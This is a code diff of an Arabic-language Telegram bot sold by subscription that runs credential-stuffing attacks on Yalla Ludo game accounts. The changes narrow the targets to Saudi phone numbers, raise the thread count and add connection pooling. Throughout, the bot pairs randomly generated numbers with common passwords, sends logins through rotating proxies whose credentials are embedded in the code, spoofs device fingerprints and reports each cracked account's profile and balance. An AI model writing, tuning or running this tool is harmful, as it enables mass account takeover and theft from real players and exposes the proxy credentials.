@@ -24,7 +24,6 @@ def get_proxy():
     """
     توليد إعدادات بروكسي جديدة لكل عملية طلب لضمان تغيير الـ IP مع كل فحص.
     """
-    session_id = random.randint(10000, 999999)
     return {
         "http": "http://330d9a235026e98dbbd8:e2737c9436c5d6c0@gw.dataimpulse.com:823",
         "https": "http://330d9a235026e98dbbd8:e2737c9436c5d6c0@gw.dataimpulse.com:823",
@@ -50,7 +49,7 @@ ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)
 
 # تخزين جلسات المشتركين بشكل مستقل تماماً
 user_sessions: Dict[int, Dict[str, Any]] = {}
-scan_threads = 5  # سرعة الفحص الافتراضية
+scan_threads = 20  # رفع السرعة الافتراضية للثريدز لتناسب الفحص السريع
 
 # تخزين المشتركين: {user_id: expiry_timestamp}
 subscribers: Dict[int, float] = {}
@@ -119,7 +118,7 @@ def gendevice():
     nonce   = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
     return device, android, shumeng, nonce
 
-def baggage(timestamp, device, android, shumeng, nonce, country="IQ"):
+def baggage(timestamp, device, android, shumeng, nonce, country="SA"):
     obj = {
         "timeSpan": timestamp, "version": "1.5.1.0",
         "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
@@ -131,7 +130,7 @@ def baggage(timestamp, device, android, shumeng, nonce, country="IQ"):
     }
     return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()
 
-def buildrequest(body, country="IQ"):
+def buildrequest(body, country="SA"):
     device, android, shumeng, nonce = gendevice()
     now    = int(time.time() * 1000)
     hera   = uuid.uuid4().hex
@@ -163,9 +162,9 @@ def buildrequest(body, country="IQ"):
     }
     return headers, wire, hera, device, android, shumeng, nonce
 
-def build_payload(mobile, password, country="IQ"):
+def build_payload(mobile, password, country="SA"):
     device, android, shumeng, nonce = gendevice()
-    area_code = "964" if country == "IQ" else "966"
+    area_code = "966"  # مخصص للسعودية فقط
     
     data = {
         "mobile": mobile, "areaCode": area_code, "password": password,
@@ -209,7 +208,7 @@ def decode_resp(resp, hera=None):
             pass
     return resp
 
-def profile_baggage(timestamp, token, hera, country="IQ"):
+def profile_baggage(timestamp, token, hera, country="SA"):
     device, android, shumeng, _ = gendevice()
     nc      = f'{random.randint(0, 2**31-1)}_{uuid.uuid4()}'
     key_hex = md5r(hera.encode() + secret.encode())
@@ -226,7 +225,7 @@ def profile_baggage(timestamp, token, hera, country="IQ"):
     }
     return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()
 
-def fetch_profile(token, user_id, login_data=None, country="IQ"):
+def fetch_profile(session_req, token, user_id, login_data=None, country="SA"):
     uid  = int(user_id) if str(user_id).isdigit() else user_id
     srvs = []
     for hc in ((login_data or {}).get('hostConfig') or []):
@@ -254,7 +253,7 @@ def fetch_profile(token, user_id, login_data=None, country="IQ"):
             'Content-Type': 'application/json; charset=utf-8',
         }
         try:
-            r   = requests.post(srv + profile_path, data=wire, headers=hdrs, proxies=get_proxy(), timeout=10)
+            r   = session_req.post(srv + profile_path, data=wire, headers=hdrs, proxies=get_proxy(), timeout=8)
             obj = decode_resp(r.json(), hera)
             if obj.get('status') == 0:
                 data = obj.get('data') or {}
@@ -271,8 +270,8 @@ def format_hit_message(data, mobile, password, country, prof):
     name = html.escape(str(raw_name))
     uid  = data.get('showNumId') or data.get('id', '—')
     
-    area_prefix = "+964" if country == "IQ" else "+966"
-    country_label = "العراق 🇮🇶" if country == "IQ" else "السعودية 🇸🇦"
+    area_prefix = "+966"
+    country_label = "السعودية 🇸🇦"
 
     lines = [
         "<b>تم صيد حساب جديد 🎯</b>",
@@ -288,24 +287,7 @@ def format_hit_message(data, mobile, password, country, prof):
         meds  = prof.get('medalCountInfo') or {}
         gold  = base.get('goldNum',         '—')
         dia   = base.get('diamondNum',       '—')
-        lvl   = base.get('levelId',          '—')
-        exp   = base.get('experience',       '—')
-        mxp   = base.get('maxExp',           '—')
-        royal = base.get('royalLevel',        0)
-        vip   = '✅ نعم' if base.get('isVip') else '❌ لا'
         frz   = '🔴 مبند (Banned)' if base.get('freezeStatus') else '🟢 نشط (Active)'
-        frame = base.get('avatarFrameId',    '—')
-        pend  = base.get('pendant',          '—')
-        npl   = base.get('nameplateNum',     '—')
-        stars = base.get('startNum',         '—')
-        tot   = game.get('totalCount',       '—')
-        wp    = game.get('totalWinPercent',  '—')
-        seg   = game.get('currentSegmentId', '—')
-        segh  = game.get('highestSegmentId', '—')
-        mg    = meds.get('goldCount',   0)
-        ms    = meds.get('silverCount', 0)
-        mc    = meds.get('copperCount', 0)
-        if isinstance(wp, float): wp = f'{wp*100:.1f}%'
 
         lines.extend([
             f"<b>عدد الذهب :</b> {gold}",
@@ -318,30 +300,11 @@ def format_hit_message(data, mobile, password, country, prof):
     lines.append("\nBy - @aboodriad")
     return "\n".join(lines)
 
-# === مولدات الأرقام للعراق والسعودية ===
-def generate_iraq_number() -> str:
-    # أرقام الهواتف العراقية الأساسية (آسياسيل، زين، كورك)
-    prefixes = ["770", "771", "772", "773", "774", "780", "781", "782", "783", "790", "791", "792", "750", "751"]
-    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
-
+# === مولد أرقام السعودية فقط ===
 def generate_saudi_number() -> str:
-    # أرقام الهواتف السعودية الأساسية (STC, Mobily, Zain)
+    # أرقام الهواتف السعودية الأساسية (STC, Mobily, Zain, Lebara, Virgin)
     prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
     return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
-
-def generate_number(country: str) -> str:
-    if country == "IQ":
-        return generate_iraq_number()
-    elif country == "SA":
-        return generate_saudi_number()
-    return generate_iraq_number()
-
-def get_country_name_label(country: str) -> str:
-    if country == "IQ":
-        return "العراق 🇮🇶"
-    elif country == "SA":
-        return "السعودية 🇸🇦"
-    return "العراق و السعودية (تلقائي) 🇮🇶🇸🇦"
 
 def check_subscription(user_id: int) -> bool:
     if user_id == ADMIN_ID:
@@ -362,7 +325,6 @@ def get_user_session(user_id: int) -> Dict[str, Any]:
             "valid_count": 0,
             "wrong_count": 0,
             "error_count": 0,
-            "current_country": "MIX",  # تبديل تلقائي بين العراق والسعودية
             "tried": set(),
             "stats_lock": threading.Lock()
         }
@@ -373,7 +335,7 @@ def get_control_keyboard(user_id: int):
     session = get_user_session(user_id)
     markup = types.InlineKeyboardMarkup(row_width=1)
     if not session["is_running"]:
-        markup.add(types.InlineKeyboardButton("▶ بدء الفحص (العراق & السعودية)", callback_data="start_check"))
+        markup.add(types.InlineKeyboardButton("▶ بدء الفحص (السعودية فقط 🇸🇦)", callback_data="start_check"))
     else:
         markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
     
@@ -390,7 +352,7 @@ def get_user_keyboard(user_id: int):
     session = get_user_session(user_id)
     markup = types.InlineKeyboardMarkup(row_width=1)
     if not session["is_running"]:
-        markup.add(types.InlineKeyboardButton("▶ بدء الفحص (العراق & السعودية)", callback_data="start_check"))
+        markup.add(types.InlineKeyboardButton("▶ بدء الفحص (السعودية فقط 🇸🇦)", callback_data="start_check"))
     else:
         markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
     return markup
@@ -406,12 +368,11 @@ def start_command(message):
     if check_subscription(user_id):
         expiry = subscribers.get(user_id, 0)
         rem_days = int((expiry - time.time()) / 86400) if expiry > time.time() else 0
-        country_label = get_country_name_label(session["current_country"])
         text = (
             f"👋 <b>أهلاً بك عزيزي المشترك في بوت فحص يالا لودو.</b>\n\n"
             f"✅ اشتراكك <b>نشط</b>\n"
             f"⏳ الفترة المتبقية: حوالي {rem_days} يوم\n"
-            f"🌐 وضع الفحص: <b>{country_label} (تلقائي)</b>\n"
+            f"🌐 وضع الفحص: <b>السعودية فقط 🇸🇦</b>\n"
             f"حالة الفحص الخاص بك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n\n"
             "تحكم بالفحص عبر الأزرار أدناه:"
         )
@@ -426,11 +387,10 @@ def admin_command(message):
         return
     user_id = message.from_user.id
     session = get_user_session(user_id)
-    country_label = get_country_name_label(session["current_country"])
     text = (
         "🎛 <b>لوحة تحكم المطور الرئيسية</b>\n\n"
         f"حالة الفحص لديك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n"
-        f"وضع الفحص: <b>{country_label}</b>\n"
+        f"وضع الفحص: <b>السعودية فقط 🇸🇦</b>\n"
         f"سرعة الفحص العامة: <b>{scan_threads} ثريد</b>\n\n"
         "اختر أحد خيارات الإدارة أدناه:"
     )
@@ -451,7 +411,6 @@ def callback_handler(call):
             bot.answer_callback_query(call.id, "⚠️ الفحص يعمل لديك بالفعل!")
             return
         
-        session["current_country"] = "MIX"
         session["is_running"] = True
         session["stop_event"].clear()
         session["valid_count"] = 0
@@ -464,10 +423,10 @@ def callback_handler(call):
         t.start()
         session["thread"] = t
 
-        bot.answer_callback_query(call.id, "✅ تم بدء الفحص التلقائي (العراق & السعودية)")
+        bot.answer_callback_query(call.id, "✅ تم بدء الفحص السريع (السعودية 🇸🇦)")
         markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
         bot.edit_message_text(
-            f"🚀 <b>جاري فحص حسابات العراق 🇮🇶 والسعودية 🇸🇦 تلقائياً...</b>\n\n"
+            f"🚀 <b>جاري فحص حسابات السعودية 🇸🇦 بسرعة عالية...</b>\n\n"
             f"✅ صيد (Valid): {session['valid_count']}\n"
             f"❌ خطأ (Wrong): {session['wrong_count']}\n"
             f"⚠️ أخطاء اتصال (Errors): {session['error_count']}",
@@ -476,31 +435,6 @@ def callback_handler(call):
             parse_mode="HTML",
             reply_markup=markup
         )
-
-    elif call.data == "back_to_admin" and is_admin:
-        country_label = get_country_name_label(session["current_country"])
-        text = (
-            "🎛 <b>لوحة تحكم المطور الرئيسية</b>\n\n"
-            f"حالة الفحص لديك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n"
-            f"وضع الفحص: <b>{country_label}</b>\n"
-            f"سرعة الفحص العامة: <b>{scan_threads} ثريد</b>\n\n"
-            "اختر أحد خيارات الإدارة أدناه:"
-        )
-        bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=get_control_keyboard(user_id))
-
-    elif call.data == "back_to_user":
-        expiry = subscribers.get(user_id, 0)
-        rem_days = int((expiry - time.time()) / 86400) if expiry > time.time() else 0
-        country_label = get_country_name_label(session["current_country"])
-        text = (
-            f"👋 <b>أهلاً بك عزيزي المشترك في بوت فحص يالا لودو.</b>\n\n"
-            f"✅ اشتراكك <b>نشط</b>\n"
-            f"⏳ الفترة المتبقية: حوالي {rem_days} يوم\n"
-            f"🌐 وضع الفحص: <b>{country_label}</b>\n"
-            f"حالة الفحص الخاص بك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n\n"
-            "تحكم بالفحص عبر الأزرار أدناه:"
-        )
-        bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=get_user_keyboard(user_id))
 
     elif call.data == "stop_check":
         if not session["is_running"]:
@@ -596,14 +530,16 @@ def run_checker_loop(chat_id, user_id, msg_id):
         'Aa100200', 'Aa10203040', 'Aa102030', 'As123123',
         'Aa11223344', 'Aa123456', 'Aa12345678', 'Ali112233',
         'Aa123456789', 'Ali100200', 'Ali20002000', 'Ahmed100200',
-        'Ahmad123123', 'qwer1234', 'qwer4321', 'q1w2e3r4', '1q2w3e4r'
+        'Ahmad123123', 'qwer1234', 'qwer4321', 'q1w2e3r4', '1q2w3e4r',
+        'Aa12341234','Aa123123@','Aa123123@@',
     ]
 
     def worker():
+        # استخدام requests.Session لتسريع الاتصالات عبر الاستفادة من Connection Pooling
+        session_req = requests.Session()
         while session["is_running"] and not session["stop_event"].is_set():
-            # اختيار الدولة تلقائياً بشكل عشوائي لكل عملية فحص بين العراق والسعودية
-            country = random.choice(["IQ", "SA"])
-            mobile = generate_number(country)
+            country = "SA"  # السعودية فقط
+            mobile = generate_saudi_number()
             
             with session["stats_lock"]:
                 if mobile in session["tried"]:
@@ -616,7 +552,7 @@ def run_checker_loop(chat_id, user_id, msg_id):
             headers, wire, hera = body
 
             try:
-                response = requests.post(api_url, data=wire, headers=headers, proxies=get_proxy(), timeout=15)
+                response = session_req.post(api_url, data=wire, headers=headers, proxies=get_proxy(), timeout=8)
                 result = decode_resp(response.json(), hera)
             except Exception:
                 with session["stats_lock"]:
@@ -632,7 +568,7 @@ def run_checker_loop(chat_id, user_id, msg_id):
                     token = data.get('token', '')
                     uid = str(data.get('id') or data.get('showNumId') or '')
                     
-                    prof = fetch_profile(token, uid, data, country)
+                    prof = fetch_profile(session_req, token, uid, data, country)
                     hit_msg = format_hit_message(data, mobile, password, country, prof)
                     
                     try:
@@ -660,7 +596,7 @@ def run_checker_loop(chat_id, user_id, msg_id):
                 
             with session["stats_lock"]:
                 status_text = (
-                    f"🚀 <b>جاري فحص حسابات العراق 🇮🇶 والسعودية 🇸🇦 تلقائياً...</b>\n\n"
+                    f"🚀 <b>جاري فحص حسابات السعودية 🇸🇦 بسرعة عالية...</b>\n\n"
                     f"✅ صيد (Valid): {session['valid_count']}\n"
                     f"❌ خطأ (Wrong): {session['wrong_count']}\n"
                     f"⚠️ أخطاء اتصال (Errors): {session['error_count']}"
@@ -673,5 +609,5 @@ def run_checker_loop(chat_id, user_id, msg_id):
                 pass
 
 if __name__ == "__main__":
-    print("🤖 Bot is running automatically for Iraq (IQ) and Saudi Arabia (SA) with dynamic rotating proxies...")
+    print("🤖 Bot is running for Saudi Arabia (SA) only with high-speed sessions and dynamic proxies...")
     bot.infinity_polling()
